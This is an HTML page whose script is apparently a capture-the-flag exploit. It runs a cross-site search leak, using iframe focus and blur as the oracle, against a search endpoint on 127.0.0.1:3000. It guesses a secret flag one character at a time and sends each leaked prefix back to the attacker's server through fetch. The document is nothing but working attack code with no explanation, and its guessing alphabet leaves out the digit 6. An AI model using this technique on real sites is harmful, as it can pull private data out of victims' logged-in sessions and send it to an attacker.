<html>
<body>
  <script>

    const sleep = (ms) => {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    var flag = "SparkCTF{"
    async function leak() {
      while (true) {
        for (let c of "abcdefghijklmnopqrstuvwxyz012345789_{}") {

          // create iframe and reset found status
          let ifr = document.createElement('iframe');
          fetch("/?c=" + flag + c)
          found = false;

          await sleep(1000)

          // note found
          document.body.onblur = async () => {
            flag += c
            fetch("/?leaked=" + flag)
            console.log("Found!: " + flag)
            found = true
            // reset onblur
            document.body.onblur = ''
            await sleep(1000)
            ifr.remove()
          }

          // note not found
          // waiting 1500 ms so chrome doesnt crash 
          setTimeout(() => {
            document.body.onblur = ''
            ifr.remove()
          }, 1500)

          console.log("Trying: ", "http://127.0.0.1:3000/api/search?input=" + encodeURIComponent(flag + c) + "#note")

          ifr.src = "http://127.0.0.1:3000/api/search?input=" + encodeURIComponent(flag + c) + "#note";
          document.body.appendChild(ifr);

          // if note found just skip to next char
          if (found) {
            console.log(window.onblur)
            ifr.remove()
            break;
          }
        }
      }
    }

    leak()
  </script>
</body>
<html>
